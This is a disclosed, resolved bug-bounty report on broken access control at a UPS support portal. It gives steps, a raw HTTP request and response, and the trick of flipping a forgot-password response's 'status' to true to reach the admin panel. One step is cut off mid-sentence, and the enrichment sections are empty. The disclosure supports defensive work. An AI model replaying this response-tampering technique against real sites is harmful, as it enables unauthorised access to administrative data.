---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1539426'
original_report_id: '1539426'
title: Broken access control
weakness: Improper Authentication - Generic
team_handle: ups
created_at: '2022-04-13T05:29:29.034Z'
disclosed_at: '2022-06-18T16:40:08.872Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 29
asset_identifier: '*.ups.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- improper-authentication-generic
---

# Broken access control

## Metadata

- HackerOne Report ID: 1539426
- Weakness: Improper Authentication - Generic
- Program: ups
- Disclosed At: 2022-06-18T16:40:08.872Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
hello ups team ,,,
I've found broken access control vulnerability in your sites 
It allows me to access the admin panel of the support team, and I can view all requests within the site

vulnerable domains:**connectnb.ups.com**
## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. go to **connectnb.ups.com** 
  2. go to **https://connectnb.ups.com/Layout/forgotPassword** ,put any email address and intercept the request
  
```
POST /api/Account/SendTempPassword/?userName=admin@admin.com HTTP/2
Host: connectnb.ups.com
Cookie: __RequestVerificationToken=ZSZXAd3wrj6GSWF1seZAIWIUPQiK4spv-xbaxR_3HxFgJnaSGKr7xXlb9iHYEUQVloknAoTtK5DmWtjdP7yVT7MQ6Z2JW3d5kK2qoxDAbas1
Content-Length: 0
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"
Accept: application/json, text/plain, */*
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Origin: https://connectnb.ups.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,ar;q=0.7


```
  3.On the burp site, intercept the response for this request and change this value to 
Then change the **"status"** value of this request from false to true

##response:

```
HTTP/2 200 OK
Cache-Control: no-cache,no-cache,no-store
Pragma: no-cache,no-cache
Content-Type: application/json; charset=utf-8
Expires: -1
Server: 
X-Content-Type-Options: nosniff
X-Xss-Protection: 1; mode=block
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=31536000; includeSubDomains;preload
X-Frame-Options: DENY
X-Ua-Compatible: IE=Edge
Content-Security-Policy: script-src 'self'; object-src 'self'; frame-ancestors 'none'
Expect-Ct: enforce, max-age=7776000, report-uri='https://connectnb.ups.com/'
Access-Control-Allow-Headers: Accept, Content-Type, Origin
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Date: Wed, 13 Apr 2022 05:09:59 GMT
Content-Length: 89

{"status":true,"errorMessage":"Username does not exist. Please enter correct Username."}
```

  4. After that, go to this path  **/resetPassword** You will notice that this page has been opened without problems

{F1690903}

Go to user or report and you will notice that it opens normally and you can fully control it

I made a video of the vulnerability that you can watch

##video POC:

{F1690906}

## Impact

The attacker can hack the admin control panel and view and modify all reports

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
